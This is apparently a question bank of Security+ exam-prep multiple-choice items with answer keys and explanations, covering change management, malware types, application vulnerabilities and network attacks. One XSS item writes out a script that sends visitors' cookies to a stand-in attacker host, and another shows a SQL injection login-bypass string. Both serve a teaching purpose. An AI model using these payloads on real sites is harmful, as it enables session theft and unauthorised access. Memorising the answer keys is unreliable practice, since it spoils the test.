    // 12 exemplars covering objective 1.3's TECHNICAL implications, which the
    // 10 Cycle-6 exemplars above (CAB/RFC/ownership/backout/window) do not reach.
    //
    // Cluster A — Application control as a change (allow list vs deny list)
    {"type":"mcq","question":"A change request proposes standardizing application execution control across production servers, and the CAB must choose between an application ALLOW LIST and a DENY LIST. Which statement BEST characterizes the trade-off the CAB should weigh?","difficulty":"Foundational","topic":"Technical Change Management","objective":"1.3","options":{"A":"An allow list is default-deny, so unknown malware is blocked, but approved software must be re-authorized when an update changes its hash; a deny list is default-allow, easier to run, but blind to unseen threats","B":"An allow list is default-allow and a deny list is default-deny, which makes the deny list the more restrictive option and therefore the safer default for hardened production servers that process regulated data","C":"Both models are default-deny and differ only in whether approved software is matched by file hash or by digital signature, so the choice between them is purely an implementation detail","D":"A deny list is the more secure model because its threat signatures are continuously updated by the vendor, whereas an allow list is a static configuration established once at build time"},"answer":"A","explanation":"An ALLOW LIST (formerly 'whitelist') is DEFAULT-DENY: nothing executes unless explicitly approved by hash, signature, publisher, or path. Because unknown malware was never approved, it is blocked by definition. The cost is operational: a legitimate update can change the executable's hash or version and stop working until the allow-list policy is updated — which makes allow-list maintenance itself a change-management activity. A DENY LIST (formerly 'blacklist') is DEFAULT-ALLOW: anything runs unless it matches a known-bad indicator, as with traditional signature-based antivirus. Easier to operate and less disruptive, but it structurally cannot block a threat it has never seen. (B) inverts both definitions. (C) Wrong — the default posture is the distinction; matching attributes are merely how an allow list identifies approved software. (D) Wrong — frequent signature updates do not overcome default-allow; a novel binary still executes.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    {"type":"mcq","question":"A change request proposes upgrading a business application from version 6 to version 7 on servers protected by an application ALLOW LIST that authorizes executables by file hash. The RFC lists backup, staging test, implementation, and backout steps. Which step is MISSING and would MOST likely cause the change to fail at implementation time?","difficulty":"Exam Level","topic":"Technical Change Management","objective":"1.3","options":{"A":"Adding the version 7 executable hashes to the application allow-list policy before deployment","B":"Disabling the application allow list on the affected servers for the duration of the change window, then re-enabling it once the upgrade has been validated","C":"Switching the affected servers from an allow list to a deny list, so that the new version is permitted by default and no hash maintenance is needed","D":"Requesting a standing exception so that the application allow list permanently ignores this application's installation directory"},"answer":"A","explanation":"Upgrading the application changes the executable, which changes its file hash. Under a hash-based allow list the version 7 binary is an unknown executable and will be BLOCKED — the installation may complete while the application refuses to launch. The correct step is to treat the allow-list policy update as an in-scope part of the change: add the new hashes (from the vendor or the staging test) before or as part of deployment. This is exactly why allow lists sit under the TECHNICAL IMPLICATIONS of change management. (B) Disabling the control removes protection precisely when new, unvalidated code is introduced. (C) Downgrading the whole control model to default-allow trades a systemic security property for local convenience. (D) A permanent directory-wide exception creates a persistent, malware-friendly gap; a genuinely required path exception should be narrowly scoped, risk-accepted, compensated, and reviewed — not adopted as the routine upgrade mechanism.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},

    // Cluster B — Restricted activities and approved scope
    {"type":"mcq","question":"A CAB approves the following change: 'Upgrade the operating system on the PRIMARY perimeter firewall from version 10.1 to 10.2.' During the maintenance window, the administrator notices that the secondary firewall is also on 10.1 and that several firewall rules appear obsolete. Which action BEST reflects the principle of RESTRICTED ACTIVITIES?","difficulty":"Exam Level","topic":"Technical Change Management","objective":"1.3","options":{"A":"Upgrade both firewalls and remove the obsolete rules, since both actions reduce risk and the maintenance window is already open and staffed","B":"Perform only the approved upgrade on the primary firewall; the secondary firewall and any rule cleanup require their own change requests and approvals","C":"Upgrade both firewalls but leave the rules untouched, since an OS upgrade is the category of work the CAB already reviewed and authorized","D":"Remove the obsolete rules first so the firewall is in a clean state, then perform the approved operating system upgrade on the primary, documenting both actions in the same change record"},"answer":"B","explanation":"Change approval is SPECIFIC, not a general licence to modify. The approved scope named one system (the primary perimeter firewall) and one action (OS 10.1 to 10.2). Everything else — the secondary firewall, unrelated rule changes, hardware replacement, routing modifications — is out of scope and constitutes RESTRICTED ACTIVITY, however sensible it seems in the moment. Acting outside the approved scope defeats the impact analysis the CAB actually performed (nobody assessed the blast radius of deleting those rules), breaks the audit trail, and can invalidate the backout plan. (A), (C), and (D) all perform unapproved work. (D) is especially dangerous: it modifies the security posture before the approved change and mixes two failure domains, so if traffic breaks afterwards the team cannot tell which action caused it. Trap: 'approval means permission to do anything I judge necessary.'","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    {"type":"mcq","question":"Midway through an approved application upgrade, a technician discovers that the new version also requires a database driver upgrade that was not identified during impact analysis and is not listed in the approved scope. Without the driver upgrade, the application will not start. What is the MOST appropriate response?","difficulty":"Hard","topic":"Technical Change Management","objective":"1.3","options":{"A":"Upgrade the driver immediately and note it in the change record afterwards, since the application cannot function without it and the change is already in progress","B":"Abandon the change permanently, mark the application as unsupported, and raise a project request to replace it with a product that has fewer dependencies","C":"Pause the change, document the newly discovered dependency, notify the change owner, and either obtain expanded authorization or invoke the backout plan","D":"Complete the application upgrade as approved and leave the application down until the next scheduled change window, without escalating the driver issue"},"answer":"C","explanation":"An unanticipated dependency discovered mid-implementation is a SCOPE EXPANSION, and scope expansion requires authorization — it does not authorize itself by being necessary. The controlled response is: pause, document the new requirement, notify the change owner (the single accountable party), and let governance decide. Depending on urgency and risk appetite the outcome may be an expedited or emergency approval extending the scope, or a decision to roll back and re-plan with the dependency properly analyzed. Either way the decision belongs to the accountable owner with the CAB's authority, not to the technician alone at 02:00. (A) is uncontrolled scope creep: the driver upgrade received no impact analysis, may have its own dependents, and may not be covered by the backout plan. (B) over-reacts — a discovered dependency is a re-planning trigger, not grounds to abandon a business-justified change. (D) knowingly leaves a production service down and suppresses the information the owner needs.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},

    // Cluster C — Availability: downtime, restarts, and validation
    {"type":"mcq","question":"A change requires upgrading two load-balanced web servers that together serve a customer-facing site. The business states that a full outage is unacceptable. Which implementation approach BEST minimizes downtime while preserving the ability to recover quickly?","difficulty":"Exam Level","topic":"Technical Change Management","objective":"1.3","options":{"A":"Schedule a full outage at 02:00 when traffic is lowest, upgrade both servers simultaneously so their versions stay aligned, and notify users of the window in advance","B":"Upgrade server A and leave server B on the old version indefinitely, so that a known-good copy of the previous build always remains available in production","C":"Upgrade both servers in place during business hours and rely on the load balancer to retry any requests that fail while each service is restarting, accepting a few user-visible errors","D":"Drain traffic from server A, upgrade and validate it, shift traffic to it, then upgrade server B — keeping the un-upgraded node available as a fallback until server A is proven"},"answer":"D","explanation":"This is a rolling upgrade (closely related to blue-green and failover maintenance patterns): redundancy keeps the service available while each node is changed and validated in turn. Critically, the un-upgraded node doubles as the rollback path — if validation of server A fails, traffic simply stays on server B and the blast radius is one node, not the whole service. (A) achieves a planned, communicated outage, a legitimate fallback when redundancy does not exist, but it does not MINIMIZE downtime when a rolling option is available, and upgrading both nodes at once destroys the fallback. (C) treats load-balancer retry logic as a substitute for change control; users see errors and there is no clean recovery. (B) leaves the estate permanently in a mixed, un-baselined state — configuration drift, not an availability strategy. Note this approach assumes the application tolerates mixed versions during the transition; that compatibility question belongs in impact analysis.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    {"type":"mcq","question":"An administrator applies an approved configuration change to a running production service. The configuration file is saved without error and the change record is updated. Which statement BEST describes why a SERVICE RESTART or APPLICATION RESTART is a distinct technical implication that must be planned within the change?","difficulty":"Exam Level","topic":"Technical Change Management","objective":"1.3","options":{"A":"Restarts are largely cosmetic on modern operating systems, because a saved configuration file is detected by the service and applied to the running process automatically within seconds","B":"Many services read configuration only at start-up, so the change is not live until a restart or reload occurs — and the restart is itself an interruption that must be scheduled and validated","C":"A restart is required only when a change has failed validation, since restarting the affected service is normally the documented first step of any well-formed backout plan approved by the CAB","D":"Restarts should be deferred to the next unplanned reboot, so that the approved maintenance window is reserved for configuration work rather than consumed by service interruptions"},"answer":"B","explanation":"Two separate ideas sit inside this technical implication. First, EFFECTIVENESS: many daemons, services, and applications load configuration once at start-up, so editing a file changes the intended state but not the running state — the change is not live until the service or application restarts (or is explicitly signalled to reload). Second, DISRUPTION: the restart drops sessions, breaks in-flight transactions, and briefly removes the service from availability. Both consequences belong in the plan — the restart is a procedure step, it consumes part of the maintenance window, dependent services may need restarting in order, and post-restart validation must confirm the service returned healthy. (A) Wrong — this is precisely the mistake the objective warns about. (C) Confuses restart-to-apply with restart-as-rollback. (D) Deferring to an unplanned reboot means the configuration silently takes effect at an unpredictable time, possibly months later, with nobody watching.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    {"type":"mcq","question":"A patch installs successfully on a production application server with no errors reported by the installer, and the maintenance window closes on schedule. Which conclusion is BEST supported?","difficulty":"Exam Level","topic":"Technical Change Management","objective":"1.3","options":{"A":"The change is successful, because an installation that completes with no errors reported by the installer is the accepted operational definition of a successful change","B":"The change is successful, provided that a tested backout plan was documented and formally approved by the change advisory board before the implementation began and was rehearsed in staging","C":"The change is not yet proven successful; the team must validate the intended result, confirm security controls, logging, and monitoring still function, and confirm user access","D":"The change is successful once the change record has been closed, because record closure constitutes the change advisory board's formal acceptance of the outcome"},"answer":"C","explanation":"A completed installation only proves the installer ran; it says nothing about whether the SYSTEM works. Post-implementation validation must confirm the intended outcome (the vulnerability is remediated, the feature is available), that functionality is intact (authentication, transactions, integrations), that SECURITY CONTROLS survived (agents running, policies enforced, allow list intact), that LOGGING AND MONITORING still emit as expected, and that no side effects appeared in dependent systems. Only then does the change move to documentation update and post-implementation review. (A) is the exam trap in its purest form: 'the install succeeded' is not 'the change succeeded' — a patch can complete cleanly while breaking TLS for a legacy client, silencing an audit log, or disabling a monitoring agent. (B) A backout plan is a prerequisite for approval, not evidence of success. (D) Record closure is an administrative act that should FOLLOW validation, not substitute for it.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},

    // Cluster D — Dependencies and legacy applications
    {"type":"mcq","question":"A network team plans to upgrade both a firewall's operating code and the centralized firewall MANAGEMENT software. The vendor's release notes state that management version 5 supports firewall code 10.x, while management version 4 does not. Which consideration is MOST important to the change plan?","difficulty":"Exam Level","topic":"Technical Change Management","objective":"1.3","options":{"A":"The two upgrades are functionally independent and may be performed in either order, provided that both of them are completed within the same approved maintenance window","B":"Both components should be upgraded simultaneously to guarantee version alignment and to eliminate any window in which the two are incompatible, using the vendor's combined upgrade bundle","C":"Only the management software version matters here, because the firewall will continue to forward production traffic normally regardless of which code version it runs","D":"The DEPENDENCY ORDER must be taken from the vendor's compatibility matrix and followed, because the wrong sequence can leave the management platform unable to administer the firewall"},"answer":"D","explanation":"Dependencies are a named technical implication of change management, and ORDER is the part most often overlooked. The manager must support the version running on the managed device: here, management v4 cannot administer firewall code 10.x, so upgrading the firewall code first would strand the device behind an incompatible manager. Losing management also means losing monitoring and — most dangerously — the ability to execute the backout plan through normal tooling. The plan must therefore derive the supported sequence from the vendor's compatibility matrix, verify out-of-band access (console/serial) as a safety net, and treat ordering as a mandatory procedural step. (A) Wrong — 'same window' does not neutralize an ordering constraint. (C) Wrong — the firewall may keep forwarding traffic while becoming unmanageable and unmonitored, a security and operational failure even though packets still flow. (B) Simultaneous upgrade of two interdependent components removes the ability to isolate which one caused a failure and rarely eliminates the incompatibility window in practice.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    {"type":"mcq","question":"During impact analysis for an estate-wide TLS-hardening change, a team identifies a business-critical LEGACY application that runs on an unsupported operating system, cannot receive security patches, and negotiates only deprecated TLS versions. Replacement is funded but 18 months away. Which approach BEST manages the risk in the interim?","difficulty":"Exam Level","topic":"Technical Change Management","objective":"1.3","options":{"A":"Exempt the system from the change and apply compensating controls — segmentation, strict firewall rules, allow listing, restricted admin access, enhanced monitoring, and more frequent backups","B":"Apply the modern TLS and patch baselines to the legacy system on the same schedule as the rest of the estate; if the application breaks, the business will be motivated to fund an earlier replacement","C":"Remove the legacy system from the asset inventory and exclude it from routine vulnerability scanning, since no remediation is possible for the findings that it would otherwise keep generating","D":"Classify the system as low risk and proceed with the change, on the basis that it is old, thoroughly understood by the support team, and has never been the target of a successful attack"},"answer":"A","explanation":"'Legacy' means unsupported and hard to change, NOT unimportant — legacy systems are frequently the ones the business cannot operate without. When a system cannot be patched or modernized on the current timeline, the correct posture is to ISOLATE, PROTECT, MONITOR, and PLAN REPLACEMENT: segment it away from general traffic, tightly constrain who and what may reach it, allow-list the executables that may run on it, cut outbound internet access, watch it more closely than a patchable host, and back it up more often because recovery becomes the primary control. For change management specifically, this is why legacy systems must be identified during impact analysis: estate-wide changes such as TLS hardening, an OS patch baseline, or a password-policy tightening can silently break them. (B) deliberately breaks a business-critical service to make a budgeting point. (C) removing an asset from inventory hides risk rather than reducing it and typically breaches compliance obligations. (D) confuses the absence of a detected attack with the absence of exposure.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    {"type":"mcq","question":"An administrator restarts an internal certificate authority server during an approved change. Immediately afterward, the help desk reports that VPN authentication, wireless 802.1X authentication, and device enrollment have all stopped working. Which failure in the change process does this scenario MOST directly illustrate?","difficulty":"Hard","topic":"Technical Change Management","objective":"1.3","options":{"A":"An inadequate maintenance window, since the restart of a widely shared authentication component should have been scheduled for a later period of substantially lower user traffic","B":"Incomplete impact analysis: undocumented 'hidden' DEPENDENCIES on services hosted by that server were never identified, so affected services and stakeholders were neither assessed nor notified","C":"A missing backout plan, since the administrator should have captured a verified virtual-machine snapshot of the certificate authority before performing any restart of the service","D":"Insufficient seniority on the change advisory board, since a more experienced approver would have recognized the operational risk and rejected the change before the maintenance window opened"},"answer":"B","explanation":"Several unrelated-looking services all silently depended on components hosted by one server. That is a HIDDEN DEPENDENCY, and hidden dependencies are the most dangerous kind precisely because impact analysis cannot assess what nobody has documented. Note the mechanism carefully: device ENROLLMENT breaks because issuing new certificates requires the CA online. VPN and 802.1X do not stop trusting already-issued certificates merely because the CA process restarted — they break when REVOCATION CHECKING (an OCSP responder or CRL distribution point commonly co-hosted on the same CA server) becomes unreachable and the relying party is configured to hard-fail. 802.1X authentication itself terminates at the RADIUS/NPS server, which is a further dependency in the chain. The systemic fixes are dependency mapping, current architecture and data-flow diagrams, and a documentation discipline that keeps them accurate — which is why DOCUMENTATION UPDATES sit inside objective 1.3. (A) A different clock time reduces the number of affected users but not the outage; the dependency would still have been missed. (C) A snapshot shortens recovery, and a backout plan is always required, but it treats the symptom: the impact was never understood. (D) The information presented to the approver was incomplete; seniority was not the gap.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},

    // Cluster E — Documentation and version control
    {"type":"mcq","question":"Following a successful firewall migration, the change owner proposes closing the change record now and updating the network diagrams, firewall rule documentation, and asset inventory 'when the team has spare capacity next quarter.' Which response BEST reflects change-management best practice?","difficulty":"Exam Level","topic":"Technical Change Management","objective":"1.3","options":{"A":"Acceptable, because documentation is administrative overhead that records the change for posterity but does not affect the security posture of the system that was actually deployed","B":"Acceptable, provided that the change was validated successfully, since demonstrating that the system works in practice supersedes the need to record how it is now configured in the diagrams","C":"Documentation updates belong to the change and should precede closure, because stale diagrams, rule records, and inventories degrade incident response, audit, recovery, and future impact analysis","D":"Documentation should instead be recreated from scratch at the next annual audit, since a single comprehensive rediscovery is more accurate and cheaper than many incremental updates"},"answer":"C","explanation":"A change is not complete when the system works; it is complete when the environment's recorded state matches its actual state. Deferred documentation reliably becomes forgotten or inaccurate documentation, and the cost lands on the next person: responders troubleshooting an outage against a diagram that no longer matches reality, auditors unable to evidence control operation, DR teams rebuilding to an obsolete design, and — most compounding of all — future impact analyses reasoning from a false picture of dependencies. That last effect is what makes stale documentation a change-management failure rather than a tidiness failure. Typical artifacts include network and data-flow diagrams, asset inventories, firewall rule and IP/DNS records, procedures, security policies, system baselines, dependency maps, and recovery instructions. (A) and (B) treat documentation as optional decoration. (D) Periodic wholesale rediscovery is expensive, error-prone, and leaves the organization blind between audits.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    {"type":"multi-select","question":"(Choose THREE) Your organization is placing infrastructure configuration files, deployment scripts, and infrastructure-as-code templates under VERSION CONTROL as part of maturing its change-management program. Which of the following are legitimate change-management benefits of doing so?","difficulty":"Hard","topic":"Technical Change Management","objective":"1.3","options":{"A":"A complete change history with author identification and timestamps, establishing accountability for who changed what and when","B":"The ability to compare versions and restore a previous known-good revision, which directly supports the backout plan","C":"Cryptographic assurance that an approved and committed change can never introduce a new vulnerability into the environment","D":"Enforcement of review and approval workflows before a change is merged into the deployed configuration","E":"Elimination of the need for a maintenance window, because committed changes deploy without any service disruption"},"answers":["A","B","D"],"explanation":"Version control operationalizes three change-management properties. (A) ACCOUNTABILITY AND AUDITABILITY: every revision carries an author, timestamp, and message, so the record of who changed what and when survives staff turnover and supports both audit and incident investigation. (B) ROLLBACK SUPPORT: version comparison (diff) shows exactly what changed, and restoring an earlier revision is a concrete, tested mechanism for returning to a known-good state — one component of a complete backout plan, alongside pre-change backups and verification steps. (D) APPROVAL WORKFLOW: branch protection and merge review force a second pair of eyes and an approval gate before a configuration reaches the deployed environment, mapping the CAB's authorization model onto the technical pipeline and supporting separation of duties. (C) is false — version control tracks and reverts changes; it makes no claim about whether the content of a change is secure, and an approved, well-tracked change can absolutely introduce a vulnerability. (E) is false and conflates two unrelated things: version control governs the CHANGE ARTIFACT, not the deployment's disruption profile. Whether a deployment needs a maintenance window depends on the architecture — redundancy, rolling upgrades, restart requirements — not on where the file is stored.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    ...
    {"type":"mcq","question":"After opening an attachment from an unsolicited email, an accounting workstation's files become unreadable. A text file appears on the desktop demanding cryptocurrency payment to restore access. Which malware type is responsible?","difficulty":"Foundational","topic":"Malware Types","objective":"2.4","options":{"A":"Trojan","B":"Worm","C":"Ransomware","D":"Spyware"},"answer":"C","explanation":"Ransomware encrypts victim data and demands payment (typically cryptocurrency) for the decryption key. The ransom note + encrypted files signature is unmistakable. Trojan (A) is malware disguised as legitimate software; ransomware is often delivered via Trojan but the symptoms here identify ransomware specifically. Worm (B) self-propagates across networks without user interaction. Spyware (D) silently exfiltrates information, not encrypts files.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"Network monitoring detects an internal host scanning thousands of other internal hosts on TCP 445, then attempting to establish SMB sessions. Within minutes, additional internal hosts begin showing identical scanning behaviour. Which malware classification BEST fits this pattern?","difficulty":"Exam Level","topic":"Malware Types","objective":"2.4","options":{"A":"Trojan","B":"Worm","C":"Logic bomb","D":"Bloatware"},"answer":"B","explanation":"Worms self-propagate across networks without user interaction by exploiting network services. The lateral spread via SMB scanning is classic worm behaviour (EternalBlue/WannaCry archetype). Trojan (A) requires user execution and does not self-replicate. Logic bomb (C) executes on a trigger condition (date, event) — not relevant to spreading mechanics. Bloatware (D) is unwanted preinstalled software, not actively malicious propagation.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A developer is fired after months of disputes with management. Six months later, the company's payroll system suddenly deletes its own data on a Friday afternoon. Investigation reveals the trigger was a check for the developer's user account in the employee table — when the account no longer existed, the destructive routine fired. Which malware type is this?","difficulty":"Exam Level","topic":"Malware Types","objective":"2.4","options":{"A":"Logic bomb","B":"Ransomware","C":"Rootkit","D":"Trojan"},"answer":"A","explanation":"Logic bombs execute malicious code when a specific logical condition is met — here, the absence of the developer's account triggered the payload. Insider-threat departure scenarios are a classic logic-bomb archetype. Ransomware (B) encrypts and demands payment, not destructive deletion on condition. Rootkit (C) hides attacker presence at the OS or kernel level. Trojan (D) is a delivery mechanism, not a trigger-based payload classification.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"Forensic analysis of a compromised Linux server reveals modified kernel modules that hide specific processes, files, and network connections from administrative tools like ps, ls, and netstat. The attacker has maintained persistent access for months without detection. Which malware classification BEST describes this?","difficulty":"Hard","topic":"Malware Types","objective":"2.4","options":{"A":"Spyware","B":"Trojan","C":"Rootkit","D":"Keylogger"},"answer":"C","explanation":"Rootkits embed in privileged OS layers (kernel modules in Linux, drivers in Windows) to hide the attacker's presence from standard system tools. The hallmark is concealment + persistence + privileged access. Spyware (A) collects data but doesn't necessarily hide at kernel level. Trojan (B) is the initial delivery wrapper. Keylogger (D) captures keystrokes but is a specific spyware subtype, not a kernel-level concealment tool.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A user downloads what appears to be a free PDF reader from a third-party site. After installation, the PDF reader works as advertised, but background telemetry shows the host establishing connections to a known command-and-control server and exfiltrating browser cookies. Which malware classification fits BEST?","difficulty":"Exam Level","topic":"Malware Types","objective":"2.4","options":{"A":"Worm","B":"Trojan","C":"Logic bomb","D":"Ransomware"},"answer":"B","explanation":"A Trojan is malware disguised as legitimate software — the PDF reader is the legitimate-appearing wrapper concealing the malicious payload. Worm (A) self-propagates; no spread is described. Logic bomb (C) requires a trigger condition; here the malicious code runs immediately. Ransomware (D) encrypts and demands payment; this is data exfiltration, not encryption.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A laptop's keyboard activity is being silently recorded and transmitted to a remote server. The attacker captures the user's banking credentials when they log in to their bank's web portal. Which malware type performs this function?","difficulty":"Foundational","topic":"Malware Types","objective":"2.4","options":{"A":"Keylogger","B":"Rootkit","C":"Worm","D":"Bloatware"},"answer":"A","explanation":"Keyloggers capture and report keystrokes — the precise behaviour described. Keyloggers can be software or hardware. Rootkit (B) hides attacker presence at OS level but does not specifically capture keystrokes (it may protect a keylogger). Worm (C) is about self-propagation. Bloatware (D) is unwanted but not necessarily malicious; it doesn't capture keystrokes.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A web application's login form accepts ' OR '1'='1 in the username field and returns an authenticated session without checking the password. Which vulnerability class is BEST being exploited?","difficulty":"Foundational","topic":"Application Vulnerabilities","objective":"2.3","options":{"A":"Cross-site scripting","B":"SQL injection","C":"Buffer overflow","D":"Race condition"},"answer":"B","explanation":"The malicious input alters the SQL query's logic (OR '1'='1' makes the WHERE clause always true) — SQL injection. The application failed to parameterize the query or sanitize input. XSS (A) targets the browser by injecting client-side script. Buffer overflow (C) targets memory bounds in lower-level code. Race condition (D) exploits time-of-check vs time-of-use timing windows.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A web application displays a user-supplied 'name' parameter directly back to the page without encoding. An attacker submits `<script>fetch('https://attacker.com/?c='+document.cookie)</script>` as their name. Visitors to a shared page now leak their session cookies. Which vulnerability class is this?","difficulty":"Exam Level","topic":"Application Vulnerabilities","objective":"2.3","options":{"A":"SQL injection","B":"Cross-site scripting (XSS)","C":"Directory traversal","D":"Server-side request forgery"},"answer":"B","explanation":"Cross-site scripting (XSS) injects malicious client-side script that executes in other users' browsers under the application's origin — which lets it read session cookies, the textbook stored-XSS impact. SQL injection (A) targets the database query layer. Directory traversal (C) reads files via path-manipulation. SSRF (D) tricks the server itself into making requests, not the client.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A C program reads a hostname into a fixed 64-byte buffer using strcpy(). A specially crafted hostname of 512 bytes containing shellcode causes the program to execute the attacker's code with the program's privileges. Which vulnerability class fits?","difficulty":"Exam Level","topic":"Application Vulnerabilities","objective":"2.3","options":{"A":"Buffer overflow","B":"Race condition","C":"Integer overflow","D":"Memory injection"},"answer":"A","explanation":"Buffer overflow occurs when input exceeds the allocated buffer size and overwrites adjacent memory — including the return address that lets the attacker redirect execution. The 512 bytes into 64-byte buffer is the canonical signature. Race condition (B) exploits timing windows, not buffer bounds. Integer overflow (C) wraps numeric values causing logic errors but not memory bounds violation directly. Memory injection (D) is the broader category; buffer overflow is the specific mechanism here.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A file-transfer application checks whether a user is authorized to read a target file, then opens and serves the file. Between the check and the open, an attacker replaces the target file with a symlink pointing to /etc/shadow. The application serves /etc/shadow to the attacker. Which vulnerability class is exploited?","difficulty":"Hard","topic":"Application Vulnerabilities","objective":"2.3","options":{"A":"Directory traversal","B":"Race condition (TOC/TOU)","C":"Cross-site scripting","D":"Server-side request forgery"},"answer":"B","explanation":"Race conditions of the Time-of-Check vs Time-of-Use (TOC/TOU) class exploit the gap between when a resource is checked (authorization decision) and when it is used (the file open). The attacker races to swap the target between those two operations. Directory traversal (A) uses path-manipulation strings like ../ to escape directories — not the mechanism here. XSS (C) is client-side script injection. SSRF (D) tricks the server into making external requests.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A vulnerability is publicly disclosed in a widely used JavaScript library; no patch exists yet. Attackers begin actively exploiting the flaw within 6 hours of disclosure. Which term BEST describes this scenario?","difficulty":"Foundational","topic":"Application Vulnerabilities","objective":"2.3","options":{"A":"Zero-day","B":"End-of-life","C":"Misconfiguration","D":"Race condition"},"answer":"A","explanation":"A zero-day vulnerability is one that is exploited before (or on the same day as) the vendor's patch is available — defenders have 'zero days' of warning to deploy a fix. End-of-life (B) is when a product is no longer supported by the vendor at all. Misconfiguration (C) is an operational deployment defect, not a software flaw. Race condition (D) is a specific class of concurrency bug, unrelated to patch-availability timing.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"During a denial-of-service attack, the target receives millions of DNS response packets it never requested. Analysis shows the source IPs are real DNS servers, and the attack volume is amplified by approximately 50x compared to the attacker's outbound bandwidth. Which attack pattern is this?","difficulty":"Exam Level","topic":"Network Attacks","objective":"2.4","options":{"A":"Reflected and amplified DDoS","B":"On-path attack","C":"SYN flood","D":"Smurf attack"},"answer":"A","explanation":"Reflected and amplified DDoS attacks spoof the victim's IP as source in queries to public services (open DNS resolvers, NTP servers, memcached) whose responses are larger than the requests. The victim receives the large responses without ever sending the queries. On-path attack (B) intercepts traffic between two endpoints — not a volumetric DoS. SYN flood (C) is a TCP-state-exhaustion attack, not amplification. Smurf attack (D) is a specific ICMP reflection variant — historically related but DNS amplification is the more general and currently more common term in the CompTIA framing.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"An attacker positions themselves between a client and an HTTPS server. By forging TLS certificates and presenting them to the client, the attacker is able to decrypt, view, and re-encrypt traffic before forwarding it. The client did not notice because their organization's MDM had pre-installed the attacker's CA certificate. Which attack class is this?","difficulty":"Exam Level","topic":"Network Attacks","objective":"2.4","options":{"A":"On-path attack","B":"Replay attack","C":"DNS poisoning","D":"DDoS reflection"},"answer":"A","explanation":"On-path attack (formerly called 'man-in-the-middle') intercepts communications between two parties without their knowledge. The TLS interception via a pre-installed trusted CA is a classic on-path technique. Replay attack (B) re-sends previously captured packets to impersonate a legitimate party. DNS poisoning (C) corrupts DNS responses to redirect traffic — could enable on-path but isn't the attack itself here. DDoS reflection (D) is about volumetric denial of service.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"An attacker on the local subnet sends forged ARP responses claiming their MAC address is the default gateway's. Hosts on the subnet update their ARP caches and begin sending traffic destined for outside the subnet to the attacker. Which attack technique is this?","difficulty":"Foundational","topic":"Network Attacks","objective":"2.4","options":{"A":"ARP poisoning","B":"DNS poisoning","C":"SYN flood","D":"Smurf attack"},"answer":"A","explanation":"ARP poisoning (also called ARP spoofing) forges ARP replies to associate the attacker's MAC address with a legitimate IP — typically the default gateway, to position the attacker on-path for all outbound traffic. DNS poisoning (B) corrupts DNS resolution, not L2 MAC-to-IP mappings. SYN flood (C) exhausts TCP state. Smurf attack (D) uses ICMP broadcast amplification, unrelated to ARP.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A penetration tester captures an authenticated session cookie from a coffee shop network and reuses it 20 minutes later from a different IP to access the victim's account without entering credentials. Which attack class BEST describes this?","difficulty":"Foundational","topic":"Network Attacks","objective":"2.4","options":{"A":"Credential replay","B":"Brute force","C":"On-path attack","D":"Privilege escalation"},"answer":"A","explanation":"Credential replay (or session-token replay) captures an authentication artefact (cookie, hash, ticket) and resubmits it to impersonate the legitimate user — no credentials are guessed. Brute force (B) systematically tries passwords. On-path attack (C) is the capture mechanism but the reuse-without-modification is specifically the replay step. Privilege escalation (D) elevates from a lower-privileged account to a higher one; here the attacker is already impersonating the target user.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A SIEM correlation rule fires after detecting: 09:00 EST login from New York, 09:15 EST login from London using the same account. Which malicious activity indicator is this?","difficulty":"Foundational","topic":"Malicious Activity Indicators","objective":"2.4","options":{"A":"Impossible travel","B":"Concurrent session usage","C":"Account lockout","D":"Resource consumption"},"answer":"A","explanation":"Impossible travel detects logins from geographically distant locations within a time interval that no physical travel could cover. NY to London in 15 minutes is impossible — clear indicator of credential compromise. Concurrent session usage (B) flags simultaneous active sessions but doesn't require geographic distance — both could be from the same campus. Account lockout (C) signals failed authentication thresholds, not successful logins. Resource consumption (D) tracks system load anomalies.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
